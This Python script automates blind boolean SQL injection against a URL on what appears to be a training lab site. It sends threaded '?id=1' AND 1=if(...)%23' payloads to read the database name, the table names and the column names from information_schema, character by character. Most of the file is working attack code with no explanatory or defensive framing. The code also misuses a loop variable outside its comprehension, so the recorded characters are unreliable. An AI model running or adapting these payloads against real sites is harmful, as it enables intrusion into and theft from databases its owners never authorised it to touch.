import requests
import string
from concurrent.futures import ThreadPoolExecutor

url = "https://5oh5gbuqjx.voorivex-lab.online/"

def make_request(payload):
    response = requests.get(url + payload)
    return response

## Define function to retrieve database length
def get_database_length():
    print('[+]: Trying to get Database Length')
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(make_request, "?id=1' AND 1=if(length(database())={},1,0)%23".format(i)) for i in range(1, 20)]
        for i, future in enumerate(futures, start=1):
            response = future.result()
            if response.status_code == 200 and response.text == '1':
                print('[++]: Database_Length is:{}'.format(i))
                return i

## Define function to retrieve database name
def get_database_name(db_length):
    print('[+]: Trying to get Database Name')
    db = ''
    with ThreadPoolExecutor() as executor:
        for i in range(1, db_length + 1):
            futures = [executor.submit(make_request, "?id=1' AND 1=if(substring(database(),{},1)='{}',1,0)%23".format(i, char)) for char in characters]
            for future in futures:
                response = future.result()
                if response.status_code == 200 and response.text == '1':
                    db += char
                    print('[+]: character found:{}'.format(char))
                    break
    print('[++]: Database Name is:{}'.format(db))
    return db

## Define function to retrieve table names
def get_table_names(db):
    print('[+]: Trying to get table Names')
    len_str = 0
    with ThreadPoolExecutor() as executor:
        for i in range(1, 100):
            payload = "?id=1' AND 1=if(length((SELECT group_concat(table_name) FROM information_schema.tables where table_schema = '{}' ))={},1,0)%23".format(db, i)
            futures = [executor.submit(make_request, payload)]
            for future in futures:
                response = future.result()
                if response.status_code == 200 and response.text == '1':
                    len_str = i
                    break

        table_names = ''
        for i in range(1, len_str + 1):
            futures = [executor.submit(make_request, "?id=1' AND 1=if(substring((SELECT group_concat(table_name) FROM information_schema.tables where table_schema = '{}'),{},1)='{}',1,0)%23".format(db, i, char)) for char in characters]
            for future in futures:
                response = future.result()
                if response.status_code == 200 and response.text == '1':
                    table_names += char
                    print('[+]: character found:{}'.format(char))
                    break
    print('[++]: Table Names are:{}'.format(table_names))
    return table_names

## Define function to retrieve column names
def get_column_names(db, table_names):
    print('[+]: Trying to get Column Names')
    column_names = ''
    for t in table_names.split(','):
        len_str = 0
        with ThreadPoolExecutor() as executor:
            for i in range(1, 100):
                payload = "?id=1' AND 1=if(length((SELECT group_concat(column_name) FROM information_schema.columns where table_schema = '{}' and table_name = '{}' ))={},1,0)%23".format(db, t, i)
                futures = [executor.submit(make_request, payload)]
                for future in futures:
                    response = future.result()
                    if response.status_code == 200 and response.text == '1':
                        len_str = i
                        break

            for i in range(1, len_str + 1):
                futures = [executor.submit(make_request, "?id=1' AND 1=if(substring((SELECT group_concat(column_name) FROM information_schema.columns where table_schema = '{}' and table_name = '{}' ),{},1)='{}',1,0)%23".format(db, t, i, char)) for char in characters]
                for future in futures:
                    response = future.result()
                    if response.status_code == 200 and response.text == '1':
                        column_names += char
                        print('[+]: character found:{}'.format(char))
                        break
        column_names += '-'

    for i, table_name in enumerate(table_names.split(',')):
        print('[++]: Columns in {} are {}'.format(table_name, column_names.split('-')[i]))

## Main function
if __name__ == "__main__":
    ## Get lowercase letters from 'a' to 'z'
    lowercase_letters = string.ascii_lowercase

    ## Get uppercase letters from 'A' to 'Z'
    uppercase_letters = string.ascii_uppercase

    ## Get digits from '0' to '9'
    digits = string.digits

    ## Combine lowercase and uppercase letters, underscore '_', '-' , ',' and digits '0' to '9'
    characters = lowercase_letters + uppercase_letters + '_' + '-' + ',' + digits

    db_length = get_database_length()
    db_name = get_database_name(db_length)
    table_names = get_table_names(db_name)
    get_column_names(db_name, table_names)
